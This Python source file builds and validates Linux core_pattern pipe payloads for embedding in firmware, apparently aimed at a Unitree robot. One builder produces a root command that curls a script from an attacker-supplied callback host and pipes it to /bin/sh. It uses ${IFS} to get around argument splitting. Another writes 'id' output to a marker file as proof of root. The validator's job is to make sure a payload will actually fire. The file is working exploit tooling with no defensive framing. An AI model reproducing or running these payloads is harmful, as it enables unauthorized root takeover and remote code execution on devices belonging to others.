"""Build and validate the core_pattern pipe payload embedded in the firmware."""

import re
import sys

SEPARATORS = {0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20, 0xA0}
SHELLS = ("/bin/sh", "/bin/bash", "/bin/busybox")
NEVER_EXITS = ("/dev/stdin", "/bin/cat", "/bin/dd", "/usr/bin/dd")

DEFAULT_FILE_PATH = "/unitree/var/data/fido-fidelis-root.txt"
DEFAULT_CALLBACK_PATH = "/a"
_SAFE_PATH = re.compile(r"/[A-Za-z0-9._~:/+-]*")
_SAFE_HOST = re.compile(r"[A-Za-z0-9.[\]:-]+")


def _require_keys(spec, required):
    if not isinstance(spec, dict):
        raise ValueError("payload must be a JSON object")
    unknown = sorted(set(spec) - required)
    missing = sorted(required - set(spec))
    if unknown:
        raise ValueError(f"payload has unknown keys: {', '.join(unknown)}")
    if missing:
        raise ValueError(f"payload is incomplete: {', '.join(missing)}")


def _safe_path(value, label):
    if not isinstance(value, str) or not _SAFE_PATH.fullmatch(value):
        raise ValueError(
            f"{label} must be an absolute path containing only shell-safe characters"
        )
    return value


def build_default_file(path=DEFAULT_FILE_PATH):
    path = _safe_path(path, "default payload path")
    return f"|/bin/sh -c /usr/bin/id>{path};sync"


def build_persistent_root_ssh(callback_host, callback_path=DEFAULT_CALLBACK_PATH):
    if not isinstance(callback_host, str) or not _SAFE_HOST.fullmatch(callback_host):
        raise ValueError(
            "persistent-root-ssh callback_host must be a host or host:port "
            "containing only shell-safe characters"
        )
    callback_path = _safe_path(callback_path, "persistent-root-ssh callback_path")
    return (
        f"|/bin/sh -c /usr/bin/curl${{IFS}}"
        f"{callback_host}{callback_path}|/bin/sh;sync"
    )


def build(spec):
    if not isinstance(spec, dict):
        raise ValueError("payload must be a JSON object")
    kind = spec.get("type")
    if kind == "default":
        _require_keys(spec, {"type", "path"})
        return build_default_file(spec["path"])
    if kind == "persistent-root-ssh":
        _require_keys(spec, {"type", "callback_host", "callback_path"})
        return build_persistent_root_ssh(
            spec["callback_host"], spec["callback_path"]
        )
    if kind == "command":
        _require_keys(spec, {"type", "pattern"})
        pattern = spec["pattern"]
        if not isinstance(pattern, str) or not pattern:
            raise ValueError("command payload pattern must be a non-empty string")
        return pattern
    raise ValueError(
        "payload type must be default, persistent-root-ssh, or command"
    )


def split_argv(pattern: str):
    out, current = [], bytearray()
    for byte in pattern.encode("latin-1"):
        if byte in SEPARATORS:
            if current:
                out.append(current.decode("latin-1"))
                current = bytearray()
        else:
            current.append(byte)
    if current:
        out.append(current.decode("latin-1"))
    return out


def validate(pattern: str, max_size: int):
    issues = []
    if not pattern.startswith("|"):
        issues.append(("error", "pattern must start with '|'"))
    try:
        raw = pattern.encode("latin-1")
    except UnicodeEncodeError as exc:
        return [("error", f"pattern is not encodable as raw bytes: {exc}")]
    if len(raw) + 1 > max_size:
        issues.append(("error", f"{len(raw)} bytes + NUL exceeds core_pattern size {max_size}"))
    argv = split_argv(pattern[1:] if pattern.startswith("|") else pattern)
    if not argv:
        return issues + [("error", "pattern has no argv after the '|'")]
    if not argv[0].startswith("/"):
        issues.append(("error", f"argv[0] {argv[0]!r} is not an absolute path"))
    if argv[0] in SHELLS and len(argv) >= 2 and argv[1] == "-c":
        if len(argv) == 2:
            issues.append(("error", "'-c' has no command word"))
        elif len(argv) > 3:
            issues.append((
                "error",
                f"literal separators split the command into {len(argv) - 2} words; "
                f"/bin/sh -c discards {argv[3:]!r}; use ${{IFS}}",
            ))
    for index in range(len(pattern) - 4):
        if pattern[index:index + 4] == "$IFS":
            following = pattern[index + 4:index + 5]
            if following and (following.isalnum() or following == "_"):
                issues.append(("error", f"bare $IFS before {following!r}; use ${{IFS}}"))
    if "%" in pattern:
        issues.append(("warn", "'%' is expanded as a core_pattern format specifier"))
    for value in NEVER_EXITS:
        if value in pattern:
            issues.append(("warn", f"{value} reads the core stream to EOF and may not exit"))
    if "grep" in pattern and "-m1" not in pattern and "-m 1" not in pattern:
        issues.append(("warn", "grep should use -m1 so the match is not lost in a pipe buffer"))
    if "sync" not in pattern:
        issues.append(("warn", "payload does not call sync before a possible target wedge"))
    if "/tmp/" in pattern:
        issues.append(("warn", "/tmp is volatile across a target reboot"))
    return issues


def report(pattern: str, max_size: int, stream=sys.stdout) -> bool:
    raw = pattern.encode("latin-1", errors="replace")
    print(f"pattern : {pattern!r}", file=stream)
    print(
        f"length  : {len(raw)} bytes + NUL ({max_size - len(raw) - 1} spare of {max_size})",
        file=stream,
    )
    print(
        f"argv    : {split_argv(pattern[1:] if pattern.startswith('|') else pattern)!r}",
        file=stream,
    )
    issues = validate(pattern, max_size)
    errors = [message for level, message in issues if level == "error"]
    for level, message in issues:
        print(f"  [{'!!' if level == 'error' else '  '}] {level.upper()}: {message}", file=stream)
    if not issues:
        print("  [ok] no issues", file=stream)
    print(f"VERDICT : {'USABLE' if not errors else 'WILL NOT WORK'}", file=stream)
    return not errors
